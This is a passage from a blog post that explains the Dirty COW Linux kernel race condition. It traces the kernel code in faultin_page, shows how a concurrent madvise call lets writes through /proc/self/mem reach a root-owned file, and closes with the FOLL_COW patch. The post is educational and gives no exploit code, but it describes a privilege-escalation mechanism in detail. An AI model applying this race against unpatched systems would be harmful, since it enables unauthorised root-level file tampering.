	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">fault_flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>

	<span class="cm">/* mlock all present pages, but do not fault in new pages */</span>
	<span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">FOLL_POPULATE</span> <span class="o">|</span> <span class="n">FOLL_MLOCK</span><span class="p">))</span> <span class="o">==</span> <span class="n">FOLL_MLOCK</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
	<span class="cm">/* For mm_populate(), just skip the stack guard page. */</span>
	<span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_POPULATE</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
			<span class="p">(</span><span class="n">stack_guard_page_start</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span> <span class="o">||</span>
			 <span class="n">stack_guard_page_end</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">address</span> <span class="o">+</span> <span class="n">PAGE_SIZE</span><span class="p">)))</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_WRITE</span><span class="p">)</span>
		<span class="n">fault_flags</span> <span class="o">|=</span> <span class="n">FAULT_FLAG_WRITE</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_REMOTE</span><span class="p">)</span>
		<span class="n">fault_flags</span> <span class="o">|=</span> <span class="n">FAULT_FLAG_REMOTE</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">nonblocking</span><span class="p">)</span>
		<span class="n">fault_flags</span> <span class="o">|=</span> <span class="n">FAULT_FLAG_ALLOW_RETRY</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_NOWAIT</span><span class="p">)</span>
		<span class="n">fault_flags</span> <span class="o">|=</span> <span class="n">FAULT_FLAG_ALLOW_RETRY</span> <span class="o">|</span> <span class="n">FAULT_FLAG_RETRY_NOWAIT</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_TRIED</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">VM_WARN_ON_ONCE</span><span class="p">(</span><span class="n">fault_flags</span> <span class="o">&amp;</span> <span class="n">FAULT_FLAG_ALLOW_RETRY</span><span class="p">);</span>
		<span class="n">fault_flags</span> <span class="o">|=</span> <span class="n">FAULT_FLAG_TRIED</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">handle_mm_fault</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">fault_flags</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="n">VM_FAULT_ERROR</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="n">VM_FAULT_OOM</span><span class="p">)</span>
			<span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">VM_FAULT_HWPOISON</span> <span class="o">|</span> <span class="n">VM_FAULT_HWPOISON_LARGE</span><span class="p">))</span>
			<span class="k">return</span> <span class="o">*</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FOLL_HWPOISON</span> <span class="o">?</span> <span class="o">-</span><span class="n">EHWPOISON</span> <span class="o">:</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">VM_FAULT_SIGBUS</span> <span class="o">|</span> <span class="n">VM_FAULT_SIGSEGV</span><span class="p">))</span>
			<span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
		<span class="n">BUG</span><span class="p">();</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">tsk</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="n">VM_FAULT_MAJOR</span><span class="p">)</span>
			<span class="n">tsk</span><span class="o">-&gt;</span><span class="n">maj_flt</span><span class="o">++</span><span class="p">;</span>
		<span class="k">else</span>
			<span class="n">tsk</span><span class="o">-&gt;</span><span class="n">min_flt</span><span class="o">++</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="n">VM_FAULT_RETRY</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">nonblocking</span><span class="p">)</span>
			<span class="o">*</span><span class="n">nonblocking</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">EBUSY</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="cm">/*
	 * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when
	 * necessary, even if maybe_mkwrite decided not to set pte_write. We
	 * can thus safely do subsequent page lookups as if they were reads.
	 * But only do so when looping for pte_write is futile: in some cases
	 * userspace may also be wanting to write to the gotten user page,
	 * which a read fault here might prevent (a readonly page might get
	 * reCOWed by userspace write).
	 */</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="n">VM_FAULT_WRITE</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_flags</span> <span class="o">&amp;</span> <span class="n">VM_WRITE</span><span class="p">))</span>
		<span class="o">*</span><span class="n">flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">FOLL_WRITE</span><span class="p">;</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The first half of the function translates <code class="highlighter-rouge">foll_flags</code> to the corresponding <code class="highlighter-rouge">fault_flags</code> that the page fault handler <code class="highlighter-rouge">handle_mm_fault</code> can understand. <code class="highlighter-rouge">handle_mm_fault</code> is responsible for resolving page faults so that the <code class="highlighter-rouge">__get_user_pages</code> can carry on with its execution.</p>

<p>In this case, because the original memory mapping for the region we want to modify is <em>read-only</em>, <code class="highlighter-rouge">handle_mm_fault</code> will honour its original permission configuration and create a new read-only (it’s a read-only mapping after all) <a href="https://en.wikipedia.org/wiki/Copy-on-write">COW page</a> (<code class="highlighter-rouge">do_wp_page</code>) for the address we want to write to, marking it <em>private</em> as well as <em>dirty</em>, hence <strong>Dirty COW</strong>.</p>

<p>The actual code that creates the COWed page is <code class="highlighter-rouge">do_wp_page</code> embedded deep in the handler, but the rough code flow can be found in the <a href="https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails">official Dirty COW page</a>:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>faultin_page
  handle_mm_fault
    __handle_mm_fault
      handle_pte_fault
        FAULT_FLAG_WRITE &amp;&amp; !pte_write
      do_wp_page
        PageAnon() &lt;- this is CoWed page already
        reuse_swap_page &lt;- page is exclusively ours
        wp_page_reuse
          maybe_mkwrite &lt;- dirty but RO again
          ret = VM_FAULT_WRITE
</code></pre></div></div>

<p>Now let’s turn our attention back to the end of <code class="highlighter-rouge">faultin_page</code>, right before the function returns, it does something that truly makes the exploit possible:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="cm">/*
	 * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when
	 * necessary, even if maybe_mkwrite decided not to set pte_write. We
	 * can thus safely do subsequent page lookups as if they were reads.
	 * But only do so when looping for pte_write is futile: in some cases
	 * userspace may also be wanting to write to the gotten user page,
	 * which a read fault here might prevent (a readonly page might get
	 * reCOWed by userspace write).
	 */</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="n">VM_FAULT_WRITE</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_flags</span> <span class="o">&amp;</span> <span class="n">VM_WRITE</span><span class="p">))</span>
		<span class="o">*</span><span class="n">flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">FOLL_WRITE</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</code></pre></div></div>

<p>After detecting a Copy On Write has happened (<code class="highlighter-rouge">ret &amp; VM_FAULT_WRITE == true</code>), it then decides to <strong>remove</strong> <code class="highlighter-rouge">FOLL_WRITE</code> from the <code class="highlighter-rouge">foll_flags</code>! Why does it want to do that??!</p>

<p>Remember the <code class="highlighter-rouge">retry</code> label? If it didn’t remove <code class="highlighter-rouge">FOLL_WRITE</code>, the next retry would follow the exact same code path. The reason being the newly minted COWed page has the same access permission (read-only) as the original page. The same access permission, the same <code class="highlighter-rouge">foll_flags</code>, the same retry, hence the loop.</p>

<p>To break this infinite retry cycle, the brilliant idea was to remove the write semantics completely, so the call to <code class="highlighter-rouge">follow_page_mask</code> in the next retry would be able to return a valid <code class="highlighter-rouge">page</code> pointing to the <code class="highlighter-rouge">start</code> address. Because now with the <code class="highlighter-rouge">FOLL_WRITE</code> gone, the <code class="highlighter-rouge">foll_flags</code> is just an ordinary read access, which is permitted by the COWed read-only page.</p>

<p>At this point, if your spidey sense is tingling, and the removal of <code class="highlighter-rouge">FOLL_WRITE</code> makes you queasy. Well done, fellow bug hunters, we are almost at the ground zero…</p>

<h2 id="the-lie">The lie</h2>

<p>Here comes the crux of the problem. By removing the write semantics from the <code class="highlighter-rouge">foll_flags</code>, <code class="highlighter-rouge">follow_page_mask</code> in the next retry will treat the access as read-only despite the goal is to write to it.</p>

<p>Now comes the kicker. <em>What if, at the same time, the COWed page is dropped by another thread calling <code class="highlighter-rouge">madvise(MADV_DONTNEED)</code>?</em></p>

<p>Immediately, nothing disastrous would happen. <code class="highlighter-rouge">follow_page_mask</code> would still fail to locate the page for the address due to the absence of the now purged COWed page thanks to <code class="highlighter-rouge">madvise</code>. But what happens next in <code class="highlighter-rouge">faultin_page</code> is interesting.</p>

<p>Because this time around <code class="highlighter-rouge">foll_flags</code> doesn’t contain <code class="highlighter-rouge">FOLL_WRITE</code>, so instead of creating a dirty COW page, <code class="highlighter-rouge">handle_mm_fault</code> will simply pull out the page that is <strong>directly mapped to the underlying privileged file</strong> from the page cache! Why such directness? Well, because the almighty kernel is only asking for <em>read</em> access (remember <code class="highlighter-rouge">FOLL_WRITE</code> has been removed), why bother creating another copy of the page, if the kernel already promises not to modify it? Kernel won’t lie to us minions right?</p>

<p>Shortly after this <code class="highlighter-rouge">faultin_page</code>, <code class="highlighter-rouge">__get_user_pages</code> will do another retry in a bid to get the page it’s been asking so many times for. Thankfully <code class="highlighter-rouge">follow_page_mask</code> in this retry finally returns us the page! And it’s no ordinary page, it’s the pristine page that’s directly tied to the privileged file!</p>

<p>The kernel has handed us the key to the privileged castle. With this page in hand, the commoner non-root program is now capable of modifying the root file!</p>

<p>It’s all because the kernel is lying here. In its subsequent retry after being told a dirty COW page is ready, it goes on to tell <code class="highlighter-rouge">follow_page_mask</code> and <code class="highlighter-rouge">handle_mm_fault</code> that only read-only access is needed. The two functions happily comply and return a <code class="highlighter-rouge">page</code> that’s <em>best optimised for the job</em>. In this case, it returns a <code class="highlighter-rouge">page</code> that if we perform modification on it would get written back to original privileged file.</p>

<p>After getting hold of the <code class="highlighter-rouge">page</code>, <code class="highlighter-rouge">__get_user_pages</code> can finally skip the <code class="highlighter-rouge">faultin_page</code> call and return the <code class="highlighter-rouge">page</code> all the way to the <code class="highlighter-rouge">__access_remote_vm</code> for further processing.</p>

<h2 id="the-massacre">The massacre</h2>

<p>So how exactly does the <code class="highlighter-rouge">page</code> get modified? Here is the relevant <a href="http://lxr.linux.no/linux+v4.8/mm/memory.c#L3894">snippet</a> of <code class="highlighter-rouge">access_remote_vm</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">maddr</span> <span class="o">=</span> <span class="n">kmap</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">write</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">copy_to_user_page</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span>
                  <span class="n">maddr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
        <span class="n">set_page_dirty_lock</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="cm">/* ... snip ... */</span>
    <span class="p">}</span>
    <span class="n">kunmap</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>

</code></pre></div></div>

<p>The <code class="highlighter-rouge">page</code> in the snippet above would be the directly mapped page we referred to earlier. The kernel first <code class="highlighter-rouge">kmap</code>s the page to bring it into the address space of the kernel itself, then promptly <strong>writes</strong> the user data in <code class="highlighter-rouge">buf</code> into said page by calling <code class="highlighter-rouge">copy_to_user_page</code>, effectively tainting the pristine page.</p>

<p>Eventually some time later, the tainted page will be written back to the privileged file in the disk either by the kernel write-back daemon (<code class="highlighter-rouge">kflushd</code> or <code class="highlighter-rouge">bdflush</code> or <code class="highlighter-rouge">kupdated</code> or <code class="highlighter-rouge">pdflush</code> threads…), or by explicitly calling <code class="highlighter-rouge">sync</code> or <code class="highlighter-rouge">fsync</code>, thus completing the attack.</p>

<p>You may want to ask: yeah, that sounds bad, but what are the odds of this happening? How big of a window is it exploitable? All this is happening in the kernel space right? And the kernel holds the right to decide when a thread gets run?</p>

<p>Unfortunately, you might have guessed it. The answer is the window is actually pretty big, Dirty COW can be triggered pretty reliably even on a single core machine, owing no less to the fact that  <code class="highlighter-rouge">__get_user_pages</code> is explicitly asking the task scheduler to switch to another thread if necessary by calling <code class="highlighter-rouge">cond_resched</code> for each retry!</p>

<p>See how the two threads race against each other:</p>

<p><img src="./2017 - Dirty COW and why lying is bad even if you are the Linux kernel_files/dirty-cow-threads.png" style="width:90%;max-width:800px;"></p>

<h2 id="hang-on-but-why-do-we-have-that-dirty-cow-page-in-the-first-place-again">Hang on, but why do we have that dirty COW page in the first place again?</h2>

<p>Astute readers may have noticed that, if we are to access the read-only file based mapping directly, a segmentation fault will be thrown directly in our faces. But why do we just get a dirty COWed page if we use <code class="highlighter-rouge">write</code> on <code class="highlighter-rouge">proc/self/mem</code>?</p>

<p>The reason has to do with how the kernel handles page faults when they happen during in-process direct memory/pointer access and during out-of-band memory access using <code class="highlighter-rouge">ptrace</code> or <code class="highlighter-rouge">/proc/{pid}/mem</code>.</p>

<p>Both cases will eventually invoke <code class="highlighter-rouge">handle_mm_fault</code> to resolve page faults. But unlike the latter that uses <code class="highlighter-rouge">faultin_page</code> to “simulate” page fault, the page faults caused by direct access are triggered by <a href="https://en.wikipedia.org/wiki/Memory_management_unit">MMU</a>, and will go through the <a href="http://lxr.linux.no/linux+v4.8/arch/x86/entry/entry_64.S#L935">interrupt handler</a>, then all the way to the platform dependent kernel function <a href="http://lxr.linux.no/linux+v4.8/arch/x86/mm/fault.c#L1174"><code class="highlighter-rouge">__do_page_fault</code></a><sup id="fnref:underscores"><a href="https://chao-tic.github.io/blog/2017/05/24/dirty-cow#fn:underscores" class="footnote">4</a></sup>.</p>

<p>In the case of directly writing to read-only memory region, the handler would detect the access violation in <a href="http://lxr.linux.no/linux+*/arch/x86/mm/fault.c#L1111"><code class="highlighter-rouge">access_error</code></a> and without hesitation signal the dreaded <code class="highlighter-rouge">SIGSEGV</code> in <a href="http://lxr.linux.no/linux+*/arch/x86/mm/fault.c#L930"><code class="highlighter-rouge">bad_area_access_error</code></a> before <code class="highlighter-rouge">handle_mm_fault</code> is reached:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">noinline</span> <span class="kt">void</span>
<span class="nf">__do_page_fault</span><span class="p">(</span><span class="k">struct</span> <span class="n">pt_regs</span> <span class="o">*</span><span class="n">regs</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">error_code</span><span class="p">,</span>
        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">address</span><span class="p">)</span>
<span class="p">{</span>
    <span class="cm">/* ... snip ... */</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">access_error</span><span class="p">(</span><span class="n">error_code</span><span class="p">,</span> <span class="n">vma</span><span class="p">)))</span> <span class="p">{</span>
        <span class="cm">/* Let's skip handle_mm_fault, here comes SIGSEGV!!! */</span>
        <span class="n">bad_area_access_error</span><span class="p">(</span><span class="n">regs</span><span class="p">,</span> <span class="n">error_code</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">vma</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* I'm here... */</span>
    <span class="n">fault</span> <span class="o">=</span> <span class="n">handle_mm_fault</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>

    <span class="cm">/* ... snip ... */</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Whereas <code class="highlighter-rouge">faultin_page</code> will begrudgingly take the access violation on the chin by creating a dirty COWed page to maintain law and order (This is a read-only after all, even the kernel can’t just so easily force it to return the directly mapped page), trusting the kernel has a perfectly good reason to violate the access, no segmentation fault!</p>

<p>Why would the kernel go to such lengths to provide this kind of out-of-band access? Why would the kernel sanction such an invasive way to have one program meddle with another process’s supposedly sacred memory space?</p>

<p>The short answer is that, yeah even though every process’s memory space is sacred, privacy is important, blah, blah. There’s still a need for <em>debuggers</em> or some other investigative programs to have ways to peek and poke a remote process’s data. It’s for the greater good! Or how else can a debugger place break points and watch variables in your buggy programs?<sup id="fnref:debug"><a href="https://chao-tic.github.io/blog/2017/05/24/dirty-cow#fn:debug" class="footnote">5</a></sup></p>

<h2 id="the-patch">The patch</h2>

<p>The fix is fairly short, the entire diff is shown below:</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/include/linux/mm.h b/include/linux/mm.h
index e9caec6..ed85879 100644
</span><span class="gd">--- a/include/linux/mm.h
</span><span class="gi">+++ b/include/linux/mm.h
</span><span class="gu">@@ -2232,6 +2232,7 @@ static inline struct page *follow_page(struct vm_area_struct *vma,
</span> #define FOLL_TRIED	0x800	/* a retry, previous pass started an IO */
 #define FOLL_MLOCK	0x1000	/* lock present pages */
 #define FOLL_REMOTE	0x2000	/* we are working on non-current tsk/mm */
<span class="gi">+#define FOLL_COW	0x4000	/* internal GUP flag */
</span> 
 typedef int (*pte_fn_t)(pte_t *pte, pgtable_t token, unsigned long addr,
 			void *data);
<span class="gh">diff --git a/mm/gup.c b/mm/gup.c
index 96b2b2f..22cc22e 100644
</span><span class="gd">--- a/mm/gup.c
</span><span class="gi">+++ b/mm/gup.c
</span><span class="gu">@@ -60,6 +60,16 @@ static int follow_pfn_pte(struct vm_area_struct *vma, unsigned long address,
</span> 	return -EEXIST;
 }
 
<span class="gi">+/*
+ * FOLL_FORCE can write to even unwritable pte's, but only
+ * after we've gone through a COW cycle and they are dirty.
+ */
+static inline bool can_follow_write_pte(pte_t pte, unsigned int flags)
+{
+	return pte_write(pte) ||
+		((flags &amp; FOLL_FORCE) &amp;&amp; (flags &amp; FOLL_COW) &amp;&amp; pte_dirty(pte));
+}
+
</span> static struct page *follow_page_pte(struct vm_area_struct *vma,
 		unsigned long address, pmd_t *pmd, unsigned int flags)
 {
<span class="gu">@@ -95,7 +105,7 @@ retry:
</span> 	}
 	if ((flags &amp; FOLL_NUMA) &amp;&amp; pte_protnone(pte))
 		goto no_page;
<span class="gd">-	if ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) {
</span><span class="gi">+	if ((flags &amp; FOLL_WRITE) &amp;&amp; !can_follow_write_pte(pte, flags)) {
</span> 		pte_unmap_unlock(ptep, ptl);
 		return NULL;
 	}
<span class="gu">@@ -412,7 +422,7 @@ static int faultin_page(struct task_struct *tsk, struct vm_area_struct *vma,
</span> 	 * reCOWed by userspace write).
 	 */
 	if ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))
<span class="gd">-		*flags &amp;= ~FOLL_WRITE;
</span><span class="gi">+	        *flags |= FOLL_COW;
</span> 	return 0;
 }
 
</code></pre></div></div>

<p>The patch introduces a brand new flag <code class="highlighter-rouge">FOLL_COW</code> to the access semantics. Instead of simply tossing out the <code class="highlighter-rouge">FOLL_WRITE</code> after a <code class="highlighter-rouge">VM_FAULT_WRITE</code> page fault, the write semantics is kept in tact. But in order to still allow it to break the retry cycle, the new flag encodes the <em>expectation</em> that the next retry will likely encounter a dirty COWed page. If the expected COWed page is not there, a <em>new</em> one is asked to be made as opposed to handing back the original copy.</p>

<p>So no more lying, the fix properly maintains the expectation of COWed page in the next round of retry, whereas the old version simply throws the write semantics out of the window and hope that the COWed page is still there in the next retry.</p>

<h2 id="conclusion">Conclusion</h2>

<p>That’s it, the moral of the story is:</p>

<ul>
  <li>Concurrent programming is hard</li>
  <li>Lying is bad</li>
</ul>

<hr>

<div class="footnotes">
  <ol>
    <li id="fn:madv">
      <p>Go <a href="https://youtu.be/bg6-LVCHmGM?t=59m8s">watch</a> legendary Bryan Cantrill’s hilarious tirade against, among other things, the idiosyncrasies of Linux <code class="highlighter-rouge">MADV_DONTNEED</code> (The presentation was “aptly” titled “A crime against common sense”).&nbsp;<a href="https://chao-tic.github.io/blog/2017/05/24/dirty-cow#fnref:madv" class="reversefootnote">↩</a></p>
    </li>
    <li id="fn:bad_name">
      <p>Well yeah, it is a buffer whose size is one page…&nbsp;<a href="https://chao-tic.github.io/blog/2017/05/24/dirty-cow#fnref:bad_name" class="reversefootnote">↩</a></p>
    </li>
    <li id="fn:goto">
      <p>For better or worse, Linux kernel developers <em>really</em> love their <code class="highlighter-rouge">goto</code>s.&nbsp;<a href="https://chao-tic.github.io/blog/2017/05/24/dirty-cow#fnref:goto" class="reversefootnote">↩</a></p>
    </li>
    <li id="fn:underscores">
      <p>Tidbit: all important functions in kernel begin with two underscores [wink]&nbsp;<a href="https://chao-tic.github.io/blog/2017/05/24/dirty-cow#fnref:underscores" class="reversefootnote">↩</a></p>
    </li>
    <li id="fn:debug">
      <p>Even though many ISAs have their own hardware based debug facilities (x86 has <a href="https://en.wikipedia.org/wiki/X86_debug_register">DR0…DR7</a>), their functionalities are too limited for what we expect from a debugger.&nbsp;<a href="https://chao-tic.github.io/blog/2017/05/24/dirty-cow#fnref:debug" class="reversefootnote">↩</a></p>
    </li>
  </ol>
</div>

</div>

<hr>
<br>

<div>
  <a class="donate-with-crypto" href="https://commerce.coinbase.com/checkout/aa9f1bb9-305b-41c1-a006-be1d8a8d4b5b" rel="noopener noreferrer" target="_blank">
    <span>Donate with Crypto</span>
  </a>
  <script src="./2017 - Dirty COW and why lying is bad even if you are the Linux kernel_files/checkout.js.下載">
  </script>
</div>


<br>
<hr>
<br>


<!-- Post comments -->
<div class="postcomments">
    <div id="disqus_recommendations" style="margin-bottom: 12px;"><iframe id="dsq-app1030" name="dsq-app1030" allowtransparency="true" frameborder="0" scrolling="no" tabindex="0" title="Disqus" width="100%" src="./2017 - Dirty COW and why lying is bad even if you are the Linux kernel_files/saved_resource.html" style="width: 100% !important; border: none !important; overflow: hidden !important; height: 0px !important; display: inline !important; box-sizing: border-box !important;"></iframe></div><div id="disqus_thread"><iframe id="dsq-app938" name="dsq-app938" allowtransparency="true" frameborder="0" scrolling="no" tabindex="0" title="Disqus" width="100%" src="./2017 - Dirty COW and why lying is bad even if you are the Linux kernel_files/saved_resource(1).html" style="width: 1px !important; min-width: 100% !important; border: none !important; overflow: hidden !important; height: 1980px !important;" horizontalscrolling="no" verticalscrolling="no"></iframe></div>
<script>

/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
var disqus_config = function () {
this.page.url = 'https://chao-tic.github.io' + '/blog/2017/05/24/dirty-cow';  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = '/blog/2017/05/24/dirty-cow'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://chao-tic-blog.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

</div>



			
			</div><!-- /.container -->
			<footer>
	    		<ul>
	        		<li><a href="mailto:chao.tic.wzc@gmail.com">email</a></li>
				</ul>
			</footer>
		
	
<iframe style="display: none;" src="./2017 - Dirty COW and why lying is bad even if you are the Linux kernel_files/saved_resource(2).html"></iframe><iframe style="display: none;" src="./2017 - Dirty COW and why lying is bad even if you are the Linux kernel_files/saved_resource(3).html"></iframe></body></html>